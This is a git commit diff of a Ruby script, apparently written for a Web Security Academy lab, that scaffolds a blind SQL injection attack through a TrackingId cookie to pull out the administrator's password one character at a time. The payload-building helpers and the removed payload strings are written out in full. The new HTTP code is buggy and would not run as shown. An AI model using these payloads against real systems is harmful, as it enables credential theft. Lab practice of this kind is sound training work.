62a199328435a7f492bcd1907f2fc0d9581d5112
jbk2 <james@humanbenefits.com>
2026-01-08 15:55:15 +0100

    scaffold fetching and sql helper methods

--- sql/lab11.rb
+++ sql/lab11.rb
@@ -1,21 +1,29 @@
-session_cookie = "rYjXpryytVRhVOZaS4Th1QtvGCfczSHg"
+require 'uri'
+require 'net/http'
+
+SESSION_COOKIE = "rYjXpryytVRhVOZaS4Th1QtvGCfczSHg"
 TRACKING_ID = "G9z8hNrmTzEUiFDR"
-
-injected_tracking_id = "G9z8hNrmTzEUiFDR'+AND+SUBSTRING((SELECT Password FROM Users WHERE Username='Administrator'), 1, 1) > 'm"
-
-find_length = "G9z8hNrmTzEUiFDR' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>19)='a"
-
-find_char1 = "G9z8hNrmTzEUiFDR' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator') > 'a"
-
-confirm_char1 = "G9z8hNrmTzEUiFDR' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator') = 'q"
-
-# iterate through the chars a-z, 0-9, 
-# 
-
+BASE_URI = "https://0a6e003a043b291e81d99dd60081008c.web-security-academy.net/"
 CHARS = ('a'..'z').to_a.concat((0..9).to_a)
 ASCII_RANGE = (32..126)
 
-puts CHARS
+def http_client
+  http = NET::HTTP.new(BASE_URI, BASE_URI.port)
+  http.use_ssl = (base.scheme = "https")
+  http.open_timeout = 5
+  http.read_timeout = 10
+  http
+end
+
+def built_request(request_uri, injected_tracking_id)
+  req = Net:HTTP::Get.new(request_uri)
+  req["Accept"] = "text/html"
+  req["Cookie"] = "TrackingId=#{injected_tracking_id}; session=#{SESSION_COOKIE}"
+  req
+end
+
+
+
 
 def sql_password_length(operator, length)
   "#{TRACKING_ID}' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password) #{operator} #{length})='a"
@@ -29,3 +37,16 @@ def sql_char_test(pword_char_index, test_ascii_no, operator)
   )) #{operator} '#{test_ascii_no}"
 end
 
+def password_length?
+  # from 1..30 call sql_password_length
+end
+
+
+def fetch
+  response = http_client.request(built_request)
+
+  puts "Status: #{res.code} #{res.message}"
+  puts "Content-Type: #{res['content-type']}"
+  puts "Body bytes: #{res.body.bytesize}"
+  puts res.body[0, 300]
+end
